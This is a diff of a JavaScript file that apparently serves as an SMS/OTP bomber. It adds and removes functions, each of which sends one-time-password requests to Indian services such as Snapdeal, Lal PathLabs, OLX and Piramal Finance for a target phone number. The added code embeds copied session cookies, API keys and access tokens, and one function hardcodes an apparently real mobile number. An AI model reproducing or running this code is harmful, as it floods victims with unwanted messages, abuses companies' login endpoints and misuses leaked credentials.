@@ -507,82 +507,7 @@ const fetchShoopySignin = async () => {
     credentials: "include",
   });
 };
-const fetchRecharge24 = async () => {
-  await fetch("https://api.recharge24.in/auth/sendotp", {
-    headers: {
-      accept: "*/*",
-      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
-      "content-type": "application/json",
-      priority: "u=1, i",
-      "sec-ch-ua":
-        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
-      "sec-ch-ua-mobile": "?0",
-      "sec-ch-ua-platform": '"Windows"',
-      "sec-fetch-dest": "empty",
-      "sec-fetch-mode": "cors",
-      "sec-fetch-site": "same-site",
-      Referer: "https://app.recharge24.in/",
-    },
-    body: '{"hash":"U2FsdGVkX1+6DAWG5xDtG1O474KSmyUvDMSELFiildk="}',
-    method: "POST",
-  });
-  await fetch("https://api.recharge24.in/info/number", {
-    headers: {
-      accept: "*/*",
-      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
-      "content-type": "application/json",
-      priority: "u=1, i",
-      "sec-ch-ua":
-        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
-      "sec-ch-ua-mobile": "?0",
-      "sec-ch-ua-platform": '"Windows"',
-      "sec-fetch-dest": "empty",
-      "sec-fetch-mode": "cors",
-      "sec-fetch-site": "same-site",
-      Referer: "https://app.recharge24.in/",
-    },
-    body: `{"number":${phone}}`,
-    method: "POST",
-  });
-};
-const fetchDuebill = async () => {
-  fetch("https://api.duebill.in/auth/sendotp", {
-    headers: {
-      accept: "*/*",
-      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
-      "content-type": "application/json",
-      priority: "u=1, i",
-      "sec-ch-ua":
-        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
-      "sec-ch-ua-mobile": "?0",
-      "sec-ch-ua-platform": '"Windows"',
-      "sec-fetch-dest": "empty",
-      "sec-fetch-mode": "cors",
-      "sec-fetch-site": "same-site",
-      Referer: "https://duebill.in/",
-    },
-    body: '{"hash":"U2FsdGVkX1884f2RQxSdX9kZ88RqYX2mWHa8diq272s="}',
-    method: "POST",
-  });
-  fetch("https://api.duebill.in/info/number", {
-    headers: {
-      accept: "*/*",
-      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
-      "content-type": "application/json",
-      priority: "u=1, i",
-      "sec-ch-ua":
-        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
-      "sec-ch-ua-mobile": "?0",
-      "sec-ch-ua-platform": '"Windows"',
-      "sec-fetch-dest": "empty",
-      "sec-fetch-mode": "cors",
-      "sec-fetch-site": "same-site",
-      Referer: "https://duebill.in/",
-    },
-    body: `{"number":${phone}}`,
-    method: "POST",
-  });
-};
+
 const fetchProvilac = async () => {
   fetch(
     `https://pune.provilac.com/restapi/customer/sendOTP/v2?mobileNumber=${phone}&cityName=Delhi%20NCR&resendOtp=false`,
@@ -625,9 +550,111 @@ const fetchNetaSampark = async () => {
     method: "POST",
   });
 };
-const fetch143ds = async () => {};
-const fetch14df3 = async () => {};
-const fetch14fg3 = async () => {};
+const fetchSnapdeal = async () => {
+  fetch("https://www.snapdeal.com/sendOTP", {
+    headers: {
+      accept: "*/*",
+      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
+      "content-type": "application/json",
+      priority: "u=1, i",
+      "sec-ch-ua":
+        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
+      "sec-ch-ua-mobile": "?0",
+      "sec-ch-ua-platform": '"Windows"',
+      "sec-fetch-dest": "empty",
+      "sec-fetch-mode": "cors",
+      "sec-fetch-site": "same-origin",
+      cookie:
+        'alps=akm; _ga=GA1.1.531005408.1788069150; JSESSIONID=9E656F7DB1282EA53773A2C160042B98; versn=v1; u=178806914988222058; sd.zone=NO_ZONE; xg="eyJ3YXAiOnsiYWUiOiIxIn0sInNjIjp7InJ0b21vZGVsIjoiSyIsInBkZEFCIjoiRSIsInBkZCI6Im1sMCJ9LCJwcyI6eyJhdCI6Im8iLCJjYiI6IkIifSwidWlkIjp7Imd1aWQiOiJiOGMwMmU4My0yMGYwLTQwZjQtYTQ2OS05ODZmNGU1ZDA1ZmIifX18fDE3ODgwNzA5NDk4ODQ="; xc="eyJ3YXAiOnsiYWUiOiIxIn0sInNjIjp7InJ0b21vZGVsIjoiSyIsInBkZEFCIjoiRSIsInBkZCI6Im1sMCJ9LCJwcyI6eyJhdCI6Im8iLCJjYiI6IkIifX0="; rzp_unified_session_id=TVs9KHXBz61Sec; _ga_DYQWSB54W2=GS2.1.s1788069149$o1$g1$t1788069160$j49$l0$h0; AWSALB=NnHPkdBPBUQtoZwA373+IU23fuPANcrrfVgJ5cwCbKhr65r2EumiqI4fIebNDx1ToPTzQa5NallGkSwFUiG1pvYkE/Sv0MwRgbQeR70pNN/ejxyRbHlJb+C8Dj5X; AWSALBCORS=NnHPkdBPBUQtoZwA373+IU23fuPANcrrfVgJ5cwCbKhr65r2EumiqI4fIebNDx1ToPTzQa5NallGkSwFUiG1pvYkE/Sv0MwRgbQeR70pNN/ejxyRbHlJb+C8Dj5X; SCOUTER=x5456usoj73395',
+      Referer: "https://www.snapdeal.com/",
+    },
+    body: `{"emailId":"","mobileNumber":"${phone}","purpose":"LOGIN_WITH_MOBILE_OTP"}`,
+    method: "POST",
+  });
+};
+const fetchDrlal = async () => {
+  fetch("https://admin-api.lalpathlabs.com/api/auth/sendOtp", {
+    headers: {
+      accept: "application/json, text/plain, */*",
+      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
+      accesstoken:
+        "U2FsdGVkX1+lpYQKszSFhL9CX/wLIy2jXv7qBc1qRcQ0pMqrRD2mjTZdrHMI4Jmw",
+      "content-type": "application/json",
+      "sec-ch-ua":
+        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
+      "sec-ch-ua-mobile": "?0",
+      "sec-ch-ua-platform": '"Windows"',
+      "sec-fetch-dest": "empty",
+      "sec-fetch-mode": "cors",
+      "sec-fetch-site": "same-site",
+      token: "49ad40548d3b449ad40548d3b40f37b1c22a4710773ff0f37b1c22a4710773ff",
+      Referer: "https://www.lalpathlabs.com/",
+    },
+    body: `{"MobileNo":"${phone}","RequestId":"fbd3ab92-1ba9-4adf-b25f-d348b78d1ac4"}`,
+    method: "POST",
+  });
+};
+const fetcholx = async () => {
+  fetch("https://www.olx.in/api/auth/authenticate?lang=en-IN", {
+    headers: {
+      accept: "*/*",
+      "accept-language": "en-US,en;q=0.6",
+      "content-type": "application/json",
+      newrelic:
+        "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM5ODM1MDYiLCJhcCI6IjE4MzQ5ODk1MzQiLCJpZCI6IjZiM2FlYjZhMzgyODEzMTYiLCJ0ciI6ImQ4OTUxMmNmNTEwZDdmMWIyZmVhOWY3ZGJmNWJhZWU2IiwidGkiOjE3ODgwNzEyMjExNTQsInRrIjoiNDIwMTQxOSJ9fQ==",
+      priority: "u=1, i",
+      "sec-ch-ua": '"Chromium";v="152", "Not?A_Brand";v="24", "Brave";v="152"',
+      "sec-ch-ua-mobile": "?0",
+      "sec-ch-ua-platform": '"Windows"',
+      "sec-fetch-dest": "empty",
+      "sec-fetch-mode": "cors",
+      "sec-fetch-site": "same-origin",
+      "sec-gpc": "1",
+      traceparent: "00-d89512cf510d7f1b2fea9f7dbf5baee6-6b3aeb6a38281316-01",
+      tracestate:
+        "4201419@nr=0-1-3983506-1834989534-6b3aeb6a38281316----1788071221154",
+      "x-panamera-client-id": "web-desktop",
+      "x-panamera-client-version": "11.55.1",
+      "x-panamera-fingerprint":
+        "980cd017730db27837a788f9baf3ba82#1788071205761",
+      cookie:
+        'bm_sz=343202FA98E19AC7A0273DE86F371C29~YAAQZfEBFy8KBD+gAQAA1UJZUQH1fVnht9Q4xR8Rla3YfPF866imrpg8FDqeaX/jnj2u6U4ozoLyHYJ4H/BMzpUCTjMQdRwG9bEc6wa66DMk/dQeF9XbGejFNLHxUeQLvVW8JMBJD6obfdKNek9XzFax3Y/G2Diw1lIOcYgAa9ILgyawbKciCRJfVue8L08mVFEGE7NRxvK6B17xzN2m3K3Wk5TuIBaUl9PnC/dMYWiC3Y1NuYoIZMqO+wLXyuiiez30dbPF6wFEBel4UvaiPY0oUbdm+ErE/7vP7B5djkWDDBbitJfaqVN7anfmlFSbBHEFwk54YewlQrfPSCISXy5EmnRMKTIKDHUL43ash+QM4tkSmozOXGsD5T2HITQRhIE/qcLbUuo2sg==~3753282~3619126; ak_bmsc=9151D77CE16A0621835D49BA0BB1FA55~000000000000000000000000000000~YAAQZfEBFy8WBD+gAQAAc09ZUQHqk4Cg+T3BiUF/pPZSCz7mNuT8rVSxzCPDGkjcAkxHCuqCBpaXfKnB/SJfVeEjk9vFUZIA6d1XsjYln6i4tkFym3jef4JKmgjRoFT/xVauqj0KRQAW1hwaE0ATVwOLwlNs5KiKYQCEGM+bf89l96ZuXHO72XopHSe/qijoSjcd8w6kw66+koXEtCc5uNQkuu9dHbW1LnF6N0HNQjWyXjcS4xVIGa1htKJtBgVbY6GmMaj6fvA2RtxZIvmRtBvlmZOnUDBViDQkv0NMRSecN0BMQ43uAJ6mo/L2DcPrcT5r8/ExSD2Kd24PiKlMdL5V52/jjtUOJd0yUAJHWwaIz4Xvoemx9nO9hch1dOxEm04q8/+T/pH8jJbPCNiGQT7NVY+EoEex640LPT04j3IG1UltkzIaXr/2SF8yiO1whvWPEBZA+Pjk5x2q+0c=; showLocationModal=2026-08-30T06:26:43.194Z; showLocationToolTip=2026-08-30T06:26:43.196Z; home_page_banner=1; bm_sv=6E9950DFFAFD7BD888F830E1BBE5F98E~YAAQZfEBF/ocBD+gAQAA2FdZUQEW6k9NwK/EjDZGg2dib/K5AGm8kDmyFrau5ljFcaHuQls456S0Ny80D33r3FLQAb4WT5jCKSbmquHzQNir3whoyjhoHEb7ws3idntcAjR4bibLNVRvaubY75ha26UmVTF1Fl/t4kEyUjdAnAYcHgSvOUDgsrA25oYBf29Mai1jI8NQeKz+V0hRsiOQEPXc0iVpP+GT0+qxwCa4OSVy29yITFD/JCmqvTS2UvwX~1; _abck=4014467348415C7EF3524E50358789E8~0~YAAQZfEBF4IrBD+gAQAA7mlZURDNPIueUUfZMKPyeyfNgvuhIhrg1bkOo7fk1M/L2NaDzr02F3Gqka8YAjNCvslyCVkeWyTr7u2pyj3k3wO2PH91Lxbo1sLSInpkuu1W4YO/RWq7dSTNU9lYB6W+VPfHHCldKU3ae5qw8YYSuZ9GMoL2sVCGEmOCLVdshTbbbIHQCKg1iZYnAn8yYCHhBW89MmBNorFPwr/+OAjddcApoi39Nl3PSTgKGLpfTv3AQ2OOgu7PUBKnVfqjrG/7LGJkZmi+DtHU+uVWVaGd2WqpLx1vZxv+l54ztb7++ZBbB/ZA8FRZpaN5hTq6QUNFIiQMYxXbYkIWTnhSCcj9bwUEZopuPvaiozEBbsPbwai6QAZKl6v9HkD9KmLyODWovqSJHeCmMT8tcjiTgGW23l0uvZo48UoQ62Y7R4CyVmubtr0RlipXhdPb4xArPMUcMI3mPqd+4mtuv1Xznqlw2zNHCnWramA+vL6SQokG1qIX9cufEKgDnBEi1DNhjHj0tqxt+Q7+siNufI3+XqtNH9i7uP6tbRDv1pUmsfDDjaS0LTNl1Nh9u/VSWkkEveIwSbdlKD8O1hOPpfMyDFNOpGWLdoo/xf7XyApncXtpp37jgqdvRCGEhMQXoKEW~-1~-1~-1~AAQAAAAG%2f%2f%2f%2f%2f1%2feNsipRVMBC4BxlYsQp45ljAexwgExSJtK64GCAMYGrh+okFAYVX007riYa6Rnte%2f63XKbWd7GYGNLPX%2fCXZtcaVOHjpPbypwW~-1; g_state={"i_l":0,"i_ll":1788071210587,"i_b":"uRGJ6E5ufBFS75zuPMeUQohHWLxubyeEFVPssH3WWVQ","i_e":{"enable_itp_optimization":24},"i_et":1788071210587}',
+      Referer: "https://www.olx.in/",
+    },
+    body: `{"grantType":"phone","phone":"+91${phone}","language":"en-IN"}`,
+    method: "POST",
+  });
+};
+const fetch14fg33dsf = async () => {
+  fetch(
+    "https://api.piramalfinance.com/api/customer-orchestrator/v1/login/otp/send",
+    {
+      headers: {
+        accept: "application/json",
+        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
+        "access-control-allow-credentials": "true",
+        "access-control-allow-headers": "*",
+        "access-control-allow-origin": "*",
+        apikey: "6z1DICUFnWz6PgpYEQEYqx33",
+        "content-type": "application/json",
+        environment: "PROD",
+        priority: "u=1, i",
+        "sec-ch-ua":
+          '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-site",
+        Referer: "https://www.piramalfinance.com/",
+      },
+      body: '{"source":"PCHF_CUSTOMER_WEBSITE","mobileNo":"7011907812"}',
+      method: "POST",
+    },
+  );
+};
+const fetch14fg3dsf = async () => {};
+
 const fetch1423 = async () => {};
 
 //  all functions total number of functions are 20
@@ -651,4 +678,6 @@ export {
   fetchShoopyWhatsapp,
   fetchProvilac,
   fetchNetaSampark,
+  fetchSnapdeal,
+  fetchDrlal,
 };
